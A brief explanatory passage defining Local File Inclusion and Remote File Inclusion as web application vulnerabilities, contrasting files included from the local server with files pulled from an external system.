LFI (Local File Inclusion) is a type of vulnerability in web applications 
where an attacker can include files that are stored locally on the server. 

RFI (Remote File Inclusion) is a vulnerability in web applications where an 
attacker can include a file from a remote server instead of from the local server. 
Itâ€™s similar to LFI, but in this case, the file being included is hosted on an external system.
